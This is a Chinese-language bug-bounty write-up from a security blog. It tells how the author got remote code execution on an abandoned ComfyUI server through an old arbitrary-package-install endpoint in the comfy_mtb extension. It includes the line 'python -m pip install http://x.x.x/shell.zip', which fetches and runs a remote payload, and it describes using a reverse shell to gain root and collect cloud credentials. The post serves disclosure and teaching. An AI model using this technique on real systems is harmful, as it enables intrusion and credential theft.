---
title: 从一个废弃AI工作流平台拿下生产网 记SRC中的一次 ComfyUI comfy_mtb 插件 RCE
url: https://rce.moe/2025/07/08/ComfyUIRCE/
source: 白帽酱の博客
date: 2025-07-09
fetch_date: 2025-10-06T23:50:24.079751
---

# 从一个废弃AI工作流平台拿下生产网 记SRC中的一次 ComfyUI comfy_mtb 插件 RCE

Toc

1. [一个奇怪的废弃资产？](#%E4%B8%80%E4%B8%AA%E5%A5%87%E6%80%AA%E7%9A%84%E5%BA%9F%E5%BC%83%E8%B5%84%E4%BA%A7%EF%BC%9F)
2. [一个ComfyUI 扩展引起的RCE](#%E4%B8%80%E4%B8%AAComfyUI-%E6%89%A9%E5%B1%95%E5%BC%95%E8%B5%B7%E7%9A%84RCE)
3. [尾声](#%E5%B0%BE%E5%A3%B0)

Toc

**0** results found
![](/images/logo.jpeg)

[首页](/)
[归档](/archives)
[分类](/categories)
[标签](/tags)
[友链](/friends)
[关于](/about)

白帽酱

白帽酱

[首页](/)
[归档](/archives)
[分类](/categories)
[标签](/tags)
[友链](/friends)
[关于](/about)

从一个废弃AI工作流平台拿下生产网 记SRC中的一次 ComfyUI comfy\_mtb 插件 RCE

2025/07/08

[WEB](/categories/WEB)

[WEB](/tags/WEB)

# 一个奇怪的废弃资产？

一天，我正看着刚刚收集的某SRC资产列表，在图标列表里发现了一个从没见过的奇怪图标。

查看了下对应的资产，发现是一个定制的ComfyUI WEB资产 。

[![](https://cdn.nlark.com/yuque/0/2025/png/25577536/1751976710953-98ee5dfc-4f14-4fbe-bb72-1b39f8ca1a6a.png)](https://cdn.nlark.com/yuque/0/2025/png/25577536/1751976710953-98ee5dfc-4f14-4fbe-bb72-1b39f8ca1a6a.png)

UI 功能基本上不全，随便写了个最小化流程执行后端还是返回500

看了下ComfyUI 这个版本的老源码 也没有发现什么能利用的地方。

# 一个ComfyUI 扩展引起的RCE

ComfyUI有一个API可以列出当前安装的扩展列表

|  |
| --- |
| ``` POST /extensions HTTP/1.1 Content-Type: application/json Host: www.example.com  ["/extensions/core/clipspace.js", "/extensions/core/colorPalette.js",......] ``` |

站点上安装第三方扩展只有十几个，我马上就把它所使用的扩展全部下载下来进行代码审计

其中有一个扩展引起了我的兴趣

[comfy\_mtb](https://github.com/melMass/comfy_mtb/blob/55226058d46a48b4251d85db035c8ef68ff9a19b/endpoint.py#L28) 扩展上有个API 它可以实现远程安装所需的python依赖

[![](https://cdn.nlark.com/yuque/0/2025/png/25577536/1751978065560-8ce491c1-65f9-447e-a039-cc4761fb2f6e.png)](https://cdn.nlark.com/yuque/0/2025/png/25577536/1751978065560-8ce491c1-65f9-447e-a039-cc4761fb2f6e.png)

看起来十分的安全 它使用的预制的包白名单

查看了下这个文件的版本历史

<https://github.com/melMass/comfy_mtb/commit/d6e004cce2c32f8e48b868e66b89f82da4887dc3>

果然 它某个版本前是可以安装任意包的

[![](https://cdn.nlark.com/yuque/0/2025/png/25577536/1751978249352-753dd11a-e879-4a4f-afad-45ea86e5a6c5.png)](https://cdn.nlark.com/yuque/0/2025/png/25577536/1751978249352-753dd11a-e879-4a4f-afad-45ea86e5a6c5.png)

现在 我们得到了一个可以安装任意pip包的pip命令注入

我们该如何利用他呢？

在公共pip仓库上上传一个恶意包?

不 python其实可以直接安装远程HTTP上的包

python -m pip install <http://x.x.x/shell.zip>

先nc 测试下目标是否出网

[![](https://cdn.nlark.com/yuque/0/2025/png/25577536/1751978695033-73a908d6-f996-46ce-ab5d-3a4366e24ee0.png)](https://cdn.nlark.com/yuque/0/2025/png/25577536/1751978695033-73a908d6-f996-46ce-ab5d-3a4366e24ee0.png)

目标返回了一个带完整pip UA的的请求!

其中linux内核版本显示了由某SRC对应公司定制的内核版本名称 进一步确定了目标资产归属

构造一个python tgz包 install.py 内写入反弹shell的py代码

触发安装几秒后 收到了一个root shell

[![](https://cdn.nlark.com/yuque/0/2025/png/25577536/1751978931961-48335c07-fda7-406b-84d1-afbc40cc0b75.png)](https://cdn.nlark.com/yuque/0/2025/png/25577536/1751978931961-48335c07-fda7-406b-84d1-afbc40cc0b75.png)

[![](https://cdn.nlark.com/yuque/0/2025/png/25577536/1751979304029-7ee0f39a-e128-4ead-904a-28cd61e2b706.png)](https://cdn.nlark.com/yuque/0/2025/png/25577536/1751979304029-7ee0f39a-e128-4ead-904a-28cd61e2b706.png)

环境变量中存在大量储存桶秘钥等敏感凭据

curl试了下生产网的GIT 和 主站内部API均可正常访问

# 尾声

提交之后不出意外的这个漏洞被降级了

这个服务主站点在漏洞提交时 已经挂出了服务终止公告 是一个已下线业务的残留服务

* 文章发表时目标所属资产已早在几个月前下线
* 资产所属业务网站也已整体下线
* 该漏洞早在2024年被修复 <https://github.com/melMass/comfy_mtb/commit/d6e004cce2c32f8e48b868e66b89f82da4887dc3>

[CVE-2025-41243 Spring Cloud Gateway SpEL 沙箱从任意属性访问到任意文件下载](/2025/09/29/CVE-2025-41243/)

[V8 字节码反编译 还原bytenode保护的js代码](/2025/01/07/v8-bytecode-decompiler/)

本文作者：[白帽酱](https://rce.moe)

永久链接：<https://rce.moe/2025/07/08/ComfyUIRCE/>

版权声明：本文首发于[白帽酱](https://rce.moe)的博客，转载请注明出处！

©2025
[白帽酱](https://rce.moe) Powered by [Hexo](https://hexo.io) |
[hexo-theme-huhu](https://github.com/shixiaohu2206/hexo-theme-huhu)